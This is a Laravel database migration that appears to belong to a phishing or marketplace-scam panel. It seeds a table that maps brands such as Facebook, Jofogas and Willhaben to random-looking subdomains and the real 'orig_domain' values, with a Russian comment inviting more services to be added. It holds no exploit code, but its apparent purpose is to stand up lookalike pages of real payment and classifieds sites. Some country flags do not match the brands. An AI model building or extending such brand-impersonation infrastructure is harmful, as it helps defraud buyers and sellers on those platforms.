<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('services', function (Blueprint $table) {
            $table->id();
            $table->text('name');
            $table->unsignedBigInteger('country_id');
            $table->tinyInteger('active')->default(1);
            $table->text('country');
            $table->text('subdomain');
            $table->text('orig_domain');
            $table->timestamps();
        });

        DB::table('services')->insert([
            [
                'name' => 'Facebook',
                'country_id' => 1,
                'active' => 1,
                'country' => '🇭🇺',
                'subdomain' => 'facebook-hu',
                'orig_domain' => 'pay.facebook.com',
            ],
            [
                'name' => 'JOFOGAS',
                'country_id' => 1,
                'active' => 1,
                'country' => '🇦🇹',
                'subdomain' => 'jofogas-at',
                'orig_domain' => 'www.jofogas.hu',
            ],
            [
                'name' => 'Facebook',
                'country_id' => 2,
                'active' => 1,
                'country' => '🇦🇹',
                'subdomain' => 'равыр6кпа',
                'orig_domain' => 'pay.facebook.com',
            ],
            [
                'name' => 'Willhaben',
                'country_id' => 2,
                'active' => 1,
                'country' => '🇭🇺',
                'subdomain' => 'hsrft5e6jhdgjg',
                'orig_domain' => 'www.willhaben.at',
            ],
            // Добавьте другие сервисы, перечисляя их здесь
        ]);

        Schema::table('services', function (Blueprint $table) {
            $table->foreign('country_id')->references('id')->on('countries')->onDelete('cascade');
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('services');
    }
};
